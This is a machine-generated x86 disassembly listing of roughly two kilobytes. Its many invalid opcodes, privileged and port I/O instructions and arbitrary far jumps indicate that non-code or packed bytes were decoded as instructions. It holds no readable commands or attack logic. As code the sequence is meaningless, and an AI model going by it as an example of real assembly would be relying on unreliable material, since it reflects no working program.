  41ab26:	and    DWORD PTR [ebx-0x6f],0xffffffd1
  41ab2a:	dec    esp
  41ab2b:	idiv   BYTE PTR [eax+esi*1+0x5e]
  41ab2f:	iret   
  41ab30:	sub    al,0xa9
  41ab32:	or     ecx,ebp
  41ab34:	retf   0x329d
  41ab37:	xor    DWORD PTR [edi],0x8cd0e18
  41ab3d:	adc    al,0xf8
  41ab3f:	pop    edx
  41ab40:	(bad)  
  41ab42:	fisubr DWORD PTR [edx-0x42]
  41ab45:	inc    ecx
  41ab46:	xor    DWORD PTR [edi],esi
  41ab48:	push   ebx
  41ab49:	cdq    
  41ab4a:	(bad)  
  41ab4b:	cld    
  41ab4c:	aas    
  41ab4d:	sar    DWORD PTR [edi],0x3e
  41ab50:	cs xchg ebp,eax
  41ab52:	pop    es
  41ab53:	repz inc ecx
  41ab55:	cmp    eax,0x43cdbd92
  41ab5a:	std    
  41ab5b:	push   0x35f50502
  41ab60:	icebp  
  41ab61:	scas   eax,DWORD PTR es:[edi]
  41ab62:	mov    BYTE PTR [edi+0x3095474a],dh
  41ab68:	and    BYTE PTR [ecx+0x25],dl
  41ab6b:	fcomp  DWORD PTR [ebx+0x7d]
  41ab6e:	sti    
  41ab6f:	nop
  41ab70:	cmc    
  41ab71:	scas   al,BYTE PTR es:[edi]
  41ab72:	cmp    eax,0x9f1841a7
  41ab77:	es push ecx
  41ab79:	shl    DWORD PTR [ebx-0x7b2b6844],0xf2
  41ab80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab81:	arpl   WORD PTR [eax+0x19d52ce8],dx
  41ab87:	int    0x53
  41ab89:	push   cs
  41ab8a:	and    al,0x47
  41ab8c:	and    al,BYTE PTR [esi-0x6991f092]
  41ab92:	out    dx,eax
  41ab93:	cmp    edi,ecx
  41ab95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab96:	lds    edx,FWORD PTR ds:0x584e219c
  41ab9c:	fs js  0x41abb6
  41ab9f:	sbb    ecx,eax
  41aba1:	bound  esp,QWORD PTR [ebx]
  41aba3:	in     al,0xcb
  41aba5:	and    al,0xa6
  41aba7:	dec    ebx
  41aba8:	add    eax,0x5088c1f6
  41abad:	xchg   esp,eax
  41abae:	xchg   BYTE PTR [esi],dh
  41abb0:	es js  0x41abf5
  41abb3:	xor    DWORD PTR [eax],ebp
  41abb5:	add    edx,esp
  41abb7:	sub    BYTE PTR [esi],dl
  41abb9:	inc    edi
  41abba:	pop    es
  41abbb:	out    dx,eax
  41abbc:	retf   0x96ef
  41abbf:	sbb    eax,0x1ab63fc
  41abc4:	arpl   WORD PTR [ecx-0x26],ax
  41abc7:	pop    eax
  41abc8:	jl     0x41ac47
  41abca:	jnp    0x41abae
  41abcc:	mov    eax,DWORD PTR [eax-0xb]
  41abcf:	fld    QWORD PTR [edi]
  41abd1:	clc    
  41abd2:	push   ds
  41abd3:	jae    0x41ac29
  41abd5:	push   ebx
  41abd6:	nop
  41abd7:	loope  0x41ac57
  41abd9:	mov    eax,ds:0x94c15231
  41abde:	cmp    cl,BYTE PTR [eax]
  41abe0:	js     0x41ac3e
  41abe2:	mov    esi,DWORD PTR [esp+ebx*4-0x66709dd5]
  41abe9:	ins    DWORD PTR es:[edi],dx
  41abea:	and    al,0xf4
  41abec:	jae    0x41ab9e
  41abee:	mov    ebx,0xb5a5b4a6
  41abf3:	les    ebp,FWORD PTR [edi+0x6bf09bb8]
  41abf9:	and    al,0x3e
  41abfb:	std    
  41abfc:	mov    cl,0x6c
  41abfe:	lods   al,BYTE PTR ds:[esi]
  41abff:	out    0x8d,al
  41ac01:	adc    bh,bl
  41ac03:	imul   esi,esi,0xf6b6c9f3
  41ac09:	fcmovne st,st(5)
  41ac0b:	or     DWORD PTR [ecx+ecx*2-0x29],edi
  41ac0f:	adc    bl,BYTE PTR [ecx-0x2]
  41ac12:	mov    ch,0xfd
  41ac14:	mov    al,0x4d
  41ac16:	dec    edi
  41ac17:	sub    BYTE PTR [ebp-0x674f0cf],cl
  41ac1d:	clc    
  41ac1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac1f:	mov    bl,BYTE PTR [ebx]
  41ac21:	out    dx,al
  41ac22:	in     eax,dx
  41ac23:	push   ebx
  41ac24:	pop    esp
  41ac25:	xor    eax,0x26e31b86
  41ac2a:	fimul  DWORD PTR [edi+0x6f3f73b5]
  41ac30:	test   ebp,eax
  41ac32:	push   edx
  41ac33:	and    esp,DWORD PTR [ebp-0x3bc1ddae]
  41ac39:	adc    DWORD PTR [edx+0xe],esp
  41ac3c:	pop    ecx
  41ac3d:	out    dx,al
  41ac3e:	dec    ecx
  41ac3f:	pop    ss
  41ac40:	outs   dx,BYTE PTR ds:[esi]
  41ac41:	sti    
  41ac42:	lods   al,BYTE PTR ds:[esi]
  41ac43:	neg    dl
  41ac45:	fist   DWORD PTR [edx]
  41ac47:	push   ss
  41ac48:	loopne 0x41ac4d
  41ac4a:	out    0x47,al
  41ac4c:	data16 sub ah,BYTE PTR [ebp+0xcc0ba74]
  41ac53:	in     al,0x25
  41ac55:	xor    edi,DWORD PTR [edi+ebp*2+0x2f]
  41ac59:	aaa    
  41ac5a:	and    esi,ebx
  41ac5c:	test   BYTE PTR [ecx-0x6dd776fa],0xc1
  41ac63:	inc    edx
  41ac64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac65:	retf   
  41ac66:	(bad)  
  41ac67:	fwait
  41ac68:	gs mov dh,0xaa
  41ac6b:	test   al,0xf1
  41ac6d:	jne    0x41ac09
  41ac6f:	jle    0x41acb4
  41ac71:	pop    edi
  41ac72:	idiv   BYTE PTR [esi]
  41ac74:	xchg   ecx,eax
  41ac75:	and    al,0x48
  41ac77:	les    ebp,FWORD PTR [edx+0x5c]
  41ac7a:	(bad)  
  41ac7c:	mov    bl,0xaf
  41ac7e:	jge    0x41aca3
  41ac80:	bound  ebp,QWORD PTR [ebx+0x1ef96e8f]
  41ac86:	xchg   esp,eax
  41ac87:	fidiv  WORD PTR [ecx]
  41ac89:	jge    0x41ac8e
  41ac8b:	shl    BYTE PTR ds:0x9ad1a728,cl
  41ac91:	ror    ah,1
  41ac93:	les    ebx,FWORD PTR [ebp-0x5f]
  41ac96:	jg     0x41ad0f
  41ac98:	shr    ah,1
  41ac9a:	das    
  41ac9b:	in     al,dx
  41ac9c:	out    dx,eax
  41ac9d:	pop    ecx
  41ac9e:	aad    0xd
  41aca0:	or     ah,BYTE PTR [ebx-0x6ae0b735]
  41aca6:	mov    ebx,0x189f17c6
  41acab:	outs   dx,BYTE PTR ds:[esi]
  41acac:	or     edi,esi
  41acae:	jg     0x41ac53
  41acb0:	sbb    al,0x76
  41acb2:	or     eax,DWORD PTR [ebx+0x736953fb]
  41acb8:	lods   eax,DWORD PTR ds:[esi]
  41acb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acba:	jns    0x41ac81
  41acbc:	loop   0x41acc5
  41acbe:	fs add al,0xa6
  41acc1:	les    ebp,FWORD PTR [eax-0x761ad848]
  41acc7:	int3   
  41acc8:	dec    esp
  41acc9:	mov    WORD PTR [esi+0x40fa6726],gs
  41accf:	mov    cl,0xb1
  41acd1:	dec    edx
  41acd2:	and    DWORD PTR [ebx-0xcd19fd2],ecx
  41acd8:	cli    
  41acd9:	sub    edi,ebp
  41acdb:	add    al,0xb1
  41acdd:	adc    al,0xf1
  41acdf:	jmp    0x41ad0d
  41ace1:	(bad)  [ebx-0x22]
  41ace4:	dec    ebx
  41ace5:	mov    edx,ss
  41ace7:	dec    esp
  41ace8:	scas   al,BYTE PTR es:[edi]
  41ace9:	popf   
  41acea:	in     eax,0xaf
  41acec:	fldenv [ecx-0x75a113b7]
  41acf2:	dec    ebp
  41acf3:	pop    esp
  41acf4:	adc    al,0x46
  41acf6:	test   eax,0x41ef9ef6
  41acfb:	mov    edi,0xf997e22e
  41ad00:	out    dx,eax
  41ad01:	jp     0x41ac91
  41ad03:	rol    DWORD PTR [eax],cl
  41ad05:	loop   0x41ad18
  41ad07:	fs inc ecx
  41ad09:	cmc    
  41ad0a:	ror    BYTE PTR [edi+0x47d6ad53],1
  41ad10:	pushf  
  41ad11:	mov    eax,ds:0x46e06624
  41ad16:	mov    bh,0x33
  41ad18:	(bad)  [esi+0x664e6329]
  41ad1e:	inc    esp
  41ad1f:	mov    bl,0xfa
  41ad21:	jmp    0x8032:0xd4986ccf
  41ad28:	ficomp WORD PTR [esi+0x288b09a1]
  41ad2e:	mov    ds:0x13f1238b,eax
  41ad33:	ror    DWORD PTR [edx-0x1d],1
  41ad36:	enter  0xa1bb,0xd9
  41ad3a:	and    DWORD PTR [edx+0xde30995],0x6b
  41ad41:	inc    edi
  41ad42:	push   esp
  41ad43:	sbb    BYTE PTR [ebp+0x4a],dl
  41ad46:	mov    ah,0x9e
  41ad48:	addr16 lahf 
  41ad4a:	mov    DWORD PTR [esi+eiz*8-0x60a2fb8e],ecx
  41ad51:	shl    BYTE PTR [ecx-0x41],cl
  41ad54:	mov    edi,0xfc51f8ab
  41ad59:	mov    ebx,eax
  41ad5b:	mov    esp,0x8a19665a
  41ad60:	adc    ecx,DWORD PTR [ecx-0x37]
  41ad63:	iret   
  41ad64:	inc    esi
  41ad65:	idiv   DWORD PTR [edi+edx*8-0x6facd952]
  41ad6c:	pop    eax
  41ad6d:	jo     0x41ad8e
  41ad6f:	jns    0x41adec
  41ad71:	push   0xffffffd7
  41ad73:	sbb    al,0x74
  41ad75:	in     eax,0x68
  41ad77:	add    esi,eax
  41ad79:	push   esp
  41ad7a:	outs   dx,BYTE PTR ds:[esi]
  41ad7b:	pusha  
  41ad7c:	mov    esi,0x80c7298c
  41ad81:	retf   0xb76d
  41ad84:	ss retf 
  41ad86:	repz lock and eax,0x995ab4cb
  41ad8d:	add    DWORD PTR [eax+0x47950efc],ecx
  41ad93:	mov    esp,0xbb9827ed
  41ad98:	fdivr  QWORD PTR [edx+0x1435e4f2]
  41ad9e:	adc    eax,0x7b9f8835
  41ada3:	push   ecx
  41ada4:	add    edi,DWORD PTR [ecx-0x3deaba44]
  41adaa:	push   ds
  41adab:	pop    esi
  41adac:	jmp    0x1562:0xd21f4e11
  41adb3:	jmp    0xbe7c67c3
  41adb8:	push   ecx
  41adb9:	sub    al,0xa6
  41adbb:	ficomp WORD PTR [esi-0x34]
  41adbe:	in     eax,dx
  41adbf:	cdq    
  41adc0:	xchg   esp,eax
  41adc1:	inc    ecx
  41adc2:	sub    eax,0x5205fa26
  41adc7:	inc    eax
  41adc8:	cmp    esi,DWORD PTR [ebx+0x7c]
  41adcb:	mov    edx,0x47f226a
  41add0:	dec    eax
  41add1:	mov    edi,0xb89980a1
  41add6:	and    al,0x44
  41add8:	mov    dh,BYTE PTR [edx+0x62e630f5]
  41adde:	sbb    al,0xca
  41ade0:	cld    
  41ade1:	push   0xffffffdd
  41ade3:	adc    DWORD PTR [eax-0x26ebe0ee],ebp
  41ade9:	xlat   BYTE PTR ds:[ebx]
  41adea:	rol    DWORD PTR [esi],1
  41adec:	aaa    
  41aded:	sub    BYTE PTR ds:0xe891b68e,0x9c
  41adf4:	xchg   cl,dl
  41adf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adf7:	(bad)  
  41adf8:	in     eax,dx
  41adf9:	dec    edi
  41adfa:	adc    edi,DWORD PTR [edi-0x4eb1c53f]
  41ae00:	or     BYTE PTR [edx+esi*2],ah
  41ae03:	push   ecx
  41ae04:	repnz xor bh,BYTE PTR [ebx]
  41ae07:	imul   ebx,DWORD PTR [ebx],0xe83adec8
  41ae0d:	sbb    BYTE PTR [ebx-0x59],ch
  41ae10:	push   ebp
  41ae11:	(bad)  
  41ae12:	inc    DWORD PTR [edx]
  41ae14:	xchg   ebx,eax
  41ae15:	push   cs
  41ae16:	dec    ecx
  41ae17:	cdq    
  41ae18:	retf   0x5c85
  41ae1b:	jp     0x41adb7
  41ae1d:	sar    esp,cl
  41ae1f:	cmp    al,0xae
  41ae21:	push   ebx
  41ae22:	pop    edi
  41ae23:	cmp    ah,BYTE PTR [edx-0x22]
  41ae26:	adc    al,0x4
  41ae28:	into   
  41ae29:	test   al,0xb3
  41ae2b:	inc    eax
  41ae2c:	pop    edi
  41ae2d:	jecxz  0x41ae40
  41ae2f:	push   0xbfd110ec
  41ae34:	(bad)  
  41ae35:	push   ss
  41ae36:	std    
  41ae37:	out    dx,eax
  41ae38:	adc    bl,BYTE PTR [eax]
  41ae3a:	sbb    ah,BYTE PTR [ebx-0x609673be]
  41ae40:	mov    ah,BYTE PTR [eax-0x6d6ccec2]
  41ae46:	jmp    0x41aebe
  41ae48:	sub    al,0x73
  41ae4a:	int    0xc3
  41ae4c:	pop    ss
  41ae4d:	jmp    0x41adf4
  41ae4f:	ret    0x5fee
  41ae52:	(bad)  
  41ae53:	mov    edi,0xb8852d2a
  41ae58:	push   0x2a
  41ae5a:	adc    eax,DWORD PTR [ebx+0x5d]
  41ae5d:	sahf   
  41ae5e:	mov    dh,0x9
  41ae60:	add    cl,BYTE PTR [edi-0x78]
  41ae63:	cmp    eax,0xfa04d3d2
  41ae68:	fdiv   st,st(4)
  41ae6a:	xchg   edx,eax
  41ae6b:	push   cs
  41ae6c:	daa    
  41ae6d:	in     al,dx
  41ae6e:	jp     0x41aec2
  41ae70:	mov    dl,0x85
  41ae72:	adc    eax,edi
  41ae74:	cmc    
  41ae75:	pop    edx
  41ae76:	or     ebx,DWORD PTR [ebp+0x5d]
  41ae79:	pushf  
  41ae7a:	gs test al,0xfd
  41ae7d:	fmul   DWORD PTR [eax-0x3a]
  41ae80:	add    DWORD PTR [ebx-0x521c1477],ebp
  41ae86:	mov    dh,bh
  41ae88:	mov    BYTE PTR [ebx+0x180bf498],0xed
  41ae8f:	rcr    bh,1
  41ae91:	fimul  DWORD PTR [edi+edi*8-0x73]
  41ae95:	lods   al,BYTE PTR ds:[esi]
  41ae96:	into   
  41ae97:	mov    ebx,0x3c570f8e
  41ae9c:	sbb    eax,DWORD PTR [ecx-0x78e45097]
  41aea2:	int3   
  41aea3:	or     al,0x38
  41aea5:	mov    eax,?
  41aea7:	(bad)  
  41aea8:	xchg   edi,eax
  41aea9:	fs (bad) 
  41aeab:	cwde   
  41aeac:	sub    DWORD PTR [edx],ebx
  41aeae:	leave  
  41aeaf:	cld    
  41aeb0:	mov    eax,ds:0x8dfae52d
  41aeb5:	jmp    0x136b:0x9bb4b8dc
  41aebc:	(bad)  
  41aebd:	mov    ch,0xd
  41aebf:	adc    al,0xf3
  41aec1:	aaa    
  41aec2:	inc    ecx
  41aec3:	mov    ds:0xe67f5c95,eax
  41aec8:	xor    al,0x68
  41aecb:	or     DWORD PTR [edx+0xb],0x3
  41aecf:	inc    edi
  41aed0:	mov    esi,0xd883b356
  41aed5:	pusha  
  41aed6:	add    edx,DWORD PTR [edi-0x56]
  41aed9:	int    0x63
  41aedb:	sub    ecx,DWORD PTR [ebx-0x50]
  41aede:	bound  ebx,QWORD PTR [ecx+ebp*8]
  41aee1:	cwde   
  41aee2:	fs add eax,0xdeb490ba
  41aee8:	test   DWORD PTR ds:0x3733ef6b,ebx
  41aeee:	jge    0x41ae74
  41aef0:	mov    ebp,0xfc6b3b00
  41aef5:	sbb    esp,DWORD PTR [esi]
  41aef7:	and    BYTE PTR [edi-0x1],bh
  41aefa:	adc    cl,BYTE PTR [edx]
  41aefc:	test   DWORD PTR [ecx+edi*1],edi
  41aeff:	sti    
  41af00:	cli    
  41af01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af02:	outs   dx,DWORD PTR ds:[esi]
  41af03:	push   esp
  41af04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af05:	cmp    al,0xa4
  41af07:	data16 daa 
  41af09:	stos   DWORD PTR es:[edi],eax
  41af0a:	or     edx,ebx
  41af0c:	cwde   
  41af0d:	cmp    BYTE PTR [eax+eiz*4],cl
  41af10:	add    DWORD PTR [esi-0xe],ecx
  41af13:	and    al,0x2f
  41af15:	stos   DWORD PTR es:[edi],eax
  41af16:	lea    ecx,[ebp+0x7f]
  41af19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af1a:	loopne 0x41af1d
  41af1c:	xchg   edi,eax
  41af1d:	out    dx,al
  41af1e:	inc    edi
  41af1f:	fnstenv [ecx]
  41af21:	jp     0x41af40
  41af23:	out    dx,eax
  41af24:	push   0xce4fe5ed
  41af29:	adc    dl,ch
  41af2b:	mov    ah,0x98
  41af2d:	jb     0x41af05
  41af2f:	js     0x41aeb1
  41af31:	pop    ebx
  41af32:	rol    bh,cl
  41af34:	fwait
  41af35:	and    eax,0xc41f04be
  41af3a:	pop    ebp
  41af3b:	jg     0x41af7d
  41af3d:	sub    eax,DWORD PTR [edx-0x61]
  41af40:	scas   al,BYTE PTR es:[edi]
  41af41:	pop    ebx
  41af42:	into   
  41af43:	shl    bh,0x8e
  41af46:	in     al,0xc6
  41af48:	(bad)  
  41af49:	mov    edi,0x5f957140
  41af4e:	popa   
  41af4f:	shr    BYTE PTR ds:0x71a27ae9,0xe2
  41af56:	jo     0x41af7c
  41af58:	cmp    DWORD PTR [eax+esi*8+0x594255a6],edi
  41af5f:	xchg   ebp,eax
  41af60:	mov    al,0x4a
  41af62:	mov    ebp,0xc805c093
  41af67:	cmp    al,0x18
  41af69:	sub    BYTE PTR [edx-0x4c],bl
  41af6c:	nop
  41af6d:	rcr    BYTE PTR [ebp+ecx*1-0x7baa4a5d],0xcb
  41af75:	pop    ebx
  41af76:	outs   dx,BYTE PTR ds:[esi]
  41af77:	xchg   esi,eax
  41af78:	pop    edi
  41af79:	sti    
  41af7a:	xlat   BYTE PTR ds:[ebx]
  41af7b:	adc    BYTE PTR [edi*4+0x726eaff7],ah
  41af82:	pop    esi
  41af83:	das    
  41af84:	lock (bad) 
  41af86:	mov    edi,0x76e974b3
  41af8b:	or     al,0x97
  41af8d:	(bad)  
  41af8e:	xor    eax,0xa03d4163
  41af93:	and    DWORD PTR [ecx-0x6d],ebx
  41af96:	in     al,dx
  41af97:	xchg   ebp,eax
  41af98:	enter  0x2d,0x78
  41af9c:	fcomp  DWORD PTR [edx]
  41af9e:	xor    al,0xb6
  41afa0:	mov    esp,0xfa33cced
  41afa5:	xchg   edx,eax
  41afa6:	out    dx,al
  41afa7:	xlat   BYTE PTR ds:[ebx]
  41afa8:	fisub  DWORD PTR [eax+0xf]
  41afab:	mov    ebx,ss
  41afad:	loop   0x41aff5
  41afaf:	sbb    al,0xea
  41afb1:	call   0x3cb3c0ed
  41afb6:	pop    edi
  41afb7:	and    eax,0x2a052aa0
  41afbc:	ja     0x41b038
  41afbe:	nop
  41afbf:	add    esi,eax
  41afc1:	push   ds
  41afc2:	jno    0x41afb0
  41afc4:	xor    DWORD PTR [eax+0x1540fc3],esp
  41afca:	icebp  
  41afcb:	push   ebx
  41afcc:	add    eax,0xdf3d47f7
  41afd1:	mov    eax,ds:0xd4b4da95
  41afd6:	call   0x5ea9c91b
  41afdb:	xchg   DWORD PTR [ebp+esi*2-0x59],ebx
  41afdf:	repnz shl DWORD PTR ds:0xddf01a11,0x94
  41afe7:	adc    BYTE PTR [esi],bh
  41afe9:	xchg   edx,eax
  41afea:	push   0x5a296606
  41afef:	sbb    BYTE PTR ds:0x7c2101e4,dl
  41aff5:	jae    0x41af89
  41aff7:	cmp    BYTE PTR [edx-0x56],ah
  41affa:	(bad)  
  41affc:	adc    BYTE PTR [ebp-0x5f],al
  41afff:	es (bad) 
  41b001:	xor    al,0x3
  41b003:	repz pop ebx
  41b005:	push   ss
  41b006:	stos   DWORD PTR es:[edi],eax
  41b007:	sbb    al,0xbe
  41b009:	xor    al,0xd8
  41b00b:	mov    edx,0xdef59fd5
  41b010:	test   al,0xd2
  41b012:	(bad)  
  41b013:	mov    BYTE PTR [edx],dl
  41b015:	lock fmul DWORD PTR [edx]
  41b018:	mov    al,ds:0xa352fcef
  41b01d:	sub    BYTE PTR [ebp+0x13],bl
  41b020:	adc    eax,0x969363a0
  41b025:	pushf  
  41b026:	repnz pop esp
  41b028:	push   ebx
  41b029:	rcl    BYTE PTR [edi],1
  41b02b:	push   esp
  41b02c:	mov    ds:0x6d8c565d,al
  41b031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b032:	inc    eax
  41b033:	inc    edi
  41b034:	xchg   ecx,eax
  41b035:	push   esi
  41b036:	mov    ah,BYTE PTR [ebp-0x58]
  41b039:	fxch   st(3)
  41b03b:	xchg   DWORD PTR [ecx+0x18],ecx
  41b03e:	ror    cl,cl
  41b040:	push   cs
  41b041:	(bad)  
  41b042:	(bad)  
  41b043:	jmp    0xf38ac8b5
  41b048:	gs cdq 
  41b04a:	fdiv   st(5),st
  41b04c:	std    
  41b04d:	cdq    
  41b04e:	jp     0x41b04e
  41b050:	ja     0x41b03f
  41b052:	arpl   si,bp
  41b054:	fst    DWORD PTR [esi-0x27f3ce29]
  41b05a:	jmp    0xc151c054
  41b05f:	rcl    DWORD PTR [eax],1
  41b061:	std    
  41b062:	pop    ebx
  41b063:	ror    BYTE PTR [edi+ebx*2],0xe
  41b067:	mov    ebx,0xc3df714
  41b06c:	sub    eax,0x4c914962
  41b071:	cld    
  41b072:	js     0x41b062
  41b074:	mov    edi,0x9707466c
  41b079:	fwait
  41b07a:	jno    0x41b0af
  41b07c:	sub    bh,BYTE PTR [ebx-0x7f5b7099]
  41b082:	test   eax,0xafa07222
  41b087:	xchg   esi,eax
  41b088:	nop
  41b089:	(bad)  [ecx]
  41b08b:	stos   BYTE PTR es:[edi],al
  41b08c:	je     0x41b0d2
  41b08e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b08f:	mov    DWORD PTR [edi+0x3cf470b6],0xf8e9c1f3
  41b099:	repnz rol DWORD PTR [ebp-0xa],cl
  41b09d:	cli    
  41b09e:	cmp    BYTE PTR [edi],dl
  41b0a0:	jl     0x41b03f
  41b0a2:	inc    ebx
  41b0a3:	out    0xc9,eax
  41b0a5:	push   ebx
  41b0a6:	or     al,0xbb
  41b0a8:	mov    DWORD PTR [edx-0x561ceca6],ecx
  41b0ae:	mov    eax,ds:0xe1bc7c8c
  41b0b3:	pop    esi
  41b0b4:	cmp    edi,DWORD PTR [edi+0x257fe8d]
  41b0ba:	daa    
  41b0bb:	cdq    
  41b0bc:	jle    0x41b05b
  41b0be:	jae    0x41b066
  41b0c0:	fs cs mov dl,0xff
  41b0c4:	jno    0x41b136
  41b0c6:	stos   BYTE PTR es:[edi],al
  41b0c7:	mov    edi,esi
  41b0c9:	iret   
  41b0ca:	cld    
  41b0cb:	stc    
  41b0cc:	pop    ss
  41b0cd:	sbb    al,0xa2
  41b0cf:	inc    edx
  41b0d0:	int    0x4d
  41b0d2:	hlt    
  41b0d3:	lock mov ds:0x7248a25d,eax
  41b0d9:	jge    0x41b0e8
  41b0db:	sbb    al,0xd5
  41b0dd:	mov    esi,0xb8be05b5
  41b0e2:	jno    0x41b144
  41b0e4:	inc    edx
  41b0e5:	inc    eax
  41b0e6:	and    DWORD PTR [ecx+0x7a5aa03],eax
  41b0ec:	and    eax,0x742d1e4d
  41b0f1:	jbe    0x41b0d7
  41b0f3:	lea    edi,[edx+ebp*1-0x77]
  41b0f7:	xor    al,0x54
  41b0f9:	ins    BYTE PTR es:[edi],dx
  41b0fa:	cmp    BYTE PTR [esi+0xdeb34fe],bl
  41b100:	sub    DWORD PTR [ebx],esi
  41b102:	not    DWORD PTR [edi]
  41b104:	stos   BYTE PTR es:[edi],al
  41b105:	(bad)  
  41b106:	(bad)  [ebp+0x48]
  41b109:	mov    BYTE PTR [ecx+ebx*4+0x54262010],cl
  41b110:	pusha  
  41b111:	aam    0x5a
  41b113:	repnz popf 
  41b115:	xchg   edi,eax
  41b116:	cld    
  41b117:	mov    eax,0x60c85941
  41b11c:	xchg   DWORD PTR [esi+ecx*2],edi
  41b11f:	ds inc edi
  41b121:	mov    ecx,DWORD PTR [edi]
  41b123:	daa    
  41b124:	scas   eax,DWORD PTR es:[edi]
  41b125:	jp     0x41b0d4
  41b127:	frstor [ebp+ebx*1+0x60957ee7]
  41b12e:	sub    eax,0x4487f386
  41b133:	push   esi
  41b134:	arpl   sp,di
  41b136:	(bad)  
  41b137:	mov    ds:0x78a35276,eax
  41b13c:	sahf   
  41b13d:	adc    DWORD PTR [edi+ebp*8],eax
  41b140:	add    al,0x50
  41b142:	cmp    bh,dl
  41b144:	xchg   ebp,eax
  41b145:	mov    esp,0x2094e6d2
  41b14a:	pop    ebx
  41b14b:	dec    ebx
  41b14c:	dec    esi
  41b14d:	and    dl,dh
  41b14f:	test   al,0x6e
  41b151:	mov    ds:0x486c75e1,al
  41b156:	pusha  
  41b157:	ins    DWORD PTR es:[edi],dx
  41b158:	fwait
  41b159:	test   DWORD PTR [eax-0xa10952e],edi
  41b15f:	mov    ah,0xef
  41b161:	test   DWORD PTR [ebp+0x661847df],ebx
  41b167:	sbb    al,0x43
  41b169:	ret    
  41b16a:	or     BYTE PTR [ecx+0x60],ah
  41b16d:	sti    
  41b16e:	mov    dh,0xf2
  41b170:	out    0xf8,al
  41b172:	clc    
  41b173:	retf   
  41b174:	sahf   
  41b175:	jae    0x41b106
  41b177:	mov    bl,0xb9
  41b179:	test   al,0xad
  41b17b:	mov    al,ds:0x43daca6e
  41b180:	xchg   edi,eax
  41b181:	pushf  
  41b182:	neg    BYTE PTR [edi*8+0x822e0fe]
  41b189:	inc    edi
  41b18a:	aaa    
  41b18b:	mov    ds:0xc0500ee4,eax
  41b190:	mov    ds:0x6dc674ff,eax
  41b195:	cdq    
  41b196:	test   eax,0x32e144c9
  41b19b:	push   ss
  41b19c:	jmp    0xab22:0x5691939e
  41b1a3:	ja     0x41b1b9
  41b1a5:	sub    eax,0x7736102d
  41b1aa:	sar    DWORD PTR [esi+0x4f93494],cl
  41b1b0:	arpl   WORD PTR [eax-0x59148d78],dx
  41b1b6:	mov    ds:0xcf27715a,eax
  41b1bb:	sbb    dl,BYTE PTR [ebp+0x1e]
  41b1be:	retf   0xa61a
  41b1c1:	mov    ch,0x1f
  41b1c3:	ds jl  0x41b1f3
  41b1c6:	mov    DWORD PTR [ebp-0x20],edx
  41b1c9:	out    0xbc,al
  41b1cb:	popf   
  41b1cc:	sbb    eax,0x5af5402c
  41b1d1:	add    dh,dl
  41b1d3:	call   ecx
  41b1d5:	mov    esp,0x41f52dc9
  41b1da:	fidiv  WORD PTR [edi-0x14]
  41b1dd:	and    al,0xd4
  41b1df:	jmp    0x41b1e9
  41b1e1:	sar    al,0xff
  41b1e4:	repnz outs dx,BYTE PTR ds:[esi]
  41b1e6:	inc    esp
  41b1e7:	or     ecx,edx
  41b1e9:	int3   
  41b1ea:	pop    es
  41b1eb:	(bad)  
  41b1ec:	jl     0x41b188
  41b1ee:	mov    gs,esp
  41b1f0:	xchg   ebx,eax
  41b1f1:	jns    0x41b25a
  41b1f3:	xor    bl,dh
  41b1f5:	jle    0x41b21a
  41b1f7:	nop
  41b1f8:	xlat   BYTE PTR ds:[ebx]
  41b1f9:	and    eax,0x4a97e9e
  41b1fe:	je     0x41b1bf
  41b200:	cdq    
  41b201:	jnp    0x41b1a2
  41b203:	popa   
  41b204:	in     eax,dx
  41b205:	lock shl BYTE PTR [esi],1
  41b208:	cli    
  41b209:	lds    edx,FWORD PTR [ecx]
  41b20b:	mov    ds:0x59413bbd,al
  41b210:	push   edi
  41b211:	add    bh,BYTE PTR [ecx-0x5e52976e]
  41b217:	out    0x47,al
  41b219:	ret    
  41b21a:	or     eax,0x6e26e11e
  41b21f:	push   DWORD PTR [ebx-0x57]
  41b222:	cmp    cl,ah
  41b224:	dec    eax
  41b225:	pop    ecx
  41b226:	xchg   edx,eax
  41b227:	ds into 
  41b229:	jbe    0x41b274
  41b22b:	aad    0xf5
  41b22d:	in     al,dx
  41b22e:	adc    ah,BYTE PTR [edx-0x2c]
  41b231:	lahf   
  41b232:	and    DWORD PTR [ebp-0x3625c2e9],ecx
  41b238:	cmp    eax,0xd720803f
  41b23d:	(bad)  
  41b23e:	sub    eax,0x16c81fa2
  41b243:	sbb    ah,BYTE PTR [edi+edi*2+0xe]
  41b247:	in     eax,dx
  41b248:	popf   
  41b249:	rsm    
  41b24b:	sbb    eax,0x6cafe1b9
  41b250:	(bad)  
  41b251:	call   0x64dd:0xc6048493
  41b258:	jno    0x41b296
  41b25a:	xchg   esi,eax
  41b25b:	jns    0x41b225
  41b25d:	hlt    
  41b25e:	jg     0x41b228
  41b260:	xchg   edi,eax
  41b261:	and    edx,edi
  41b263:	xlat   BYTE PTR ds:[ebx]
  41b264:	xor    dh,BYTE PTR [esi-0x26159294]
  41b26a:	popf   
  41b26b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b26c:	fs pop esp
  41b26e:	fistp  QWORD PTR [esi+0x5b23b26b]
  41b274:	test   DWORD PTR [ebp+0x17ef1116],edx
  41b27a:	nop
  41b27b:	or     BYTE PTR [ecx-0x554b0229],ch
  41b281:	cmp    ebx,DWORD PTR [edi+eiz*4+0x7a]
  41b285:	outs   dx,DWORD PTR ds:[esi]
  41b286:	xchg   edx,eax
  41b287:	jmp    0x41b2b1
  41b289:	add    al,0xb6
  41b28b:	fiadd  DWORD PTR [esi+0x5b]
  41b28e:	retf   
  41b28f:	dec    edx
  41b290:	fsub   QWORD PTR [ecx+esi*2+0x6]
  41b294:	adc    eax,0xa2c18e09
  41b299:	retf   0x2dd
  41b29c:	arpl   WORD PTR [edx],sp
  41b29e:	cmp    DWORD PTR [edx+0x68bb0631],ebx
